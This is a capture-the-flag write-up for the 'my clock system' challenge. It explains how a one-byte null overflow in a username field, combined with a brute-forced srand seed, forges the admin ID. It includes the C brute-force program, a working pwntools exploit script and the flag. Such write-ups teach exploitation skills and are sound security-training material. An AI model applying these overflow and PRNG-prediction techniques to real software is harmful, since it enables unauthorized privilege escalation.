## `my clock system`
### Problem Description
- Author: aynakeya
    - Just another service used to get the time, but this one seems to be broken. I have to set the current time before I can check the time, otherwise the time is not accurate.

### Solution
In this challenge, we need to get the flag by calling `get_secret`, which is option 0x1337 (i.e. 4919). However, this only works if our `current_user`'s ID is the admin ID. First thing we note is that while `get_str` only gets 64 chars, the null termination byte is written too, so writing to a `clock_user` can actually overwrite the least significant byte of `id` with 0, which is what we want because the admin ID ends in 00. However, we need to find a seed such that when we set the time to that seed, we only need to `reset_user` once to set the upper 3 bytes of the id to 0x55baa5. This is where brute force, once again, comes in handy:

```c
#include <stdlib.h>
#include <stdio.h>

int main() {
    for (unsigned seed = 0; seed < 0xffffffff; ++seed) {
        srand(seed);
        int output = rand();

        if ((output & 0xffffff00) >> 8 == 0x55baa5) {
            printf("%d\n", seed);
            break;
        }
    }
}

// output: 4546713
```

Now we just need to `pwntools` this:

### Script
```python
import re

io = start()

SEED = 4546713
io.recvlines(3)
io.sendline(b"1") # new account
io.recvline()
io.sendline(b"a" * 64) # username is 64 as to write a 0 byte to the user ID
io.recvuntil(b"> > ")
io.sendline(b"2") # set current time to SEED
io.sendlineafter(b"please enter current time: ", str(SEED).encode())
io.sendlineafter(b"> ", b"3") # reset account to call rand() with SEED once
io.recvline()
io.sendline(b"a" * 64) # username is get after setting the ID, so overwrite the user ID with a 0 byte again
io.recvlines(2)
io.sendlineafter(b"> > ", b"4919") # get_secret!!
print(re.search(r"maple\{[a-zA-Z0-9_!\-\?]+\}", io.recvline().decode())[0])
io.close()
```

### Flag: `maple{1_by73_0v3rfl0w_ovo}`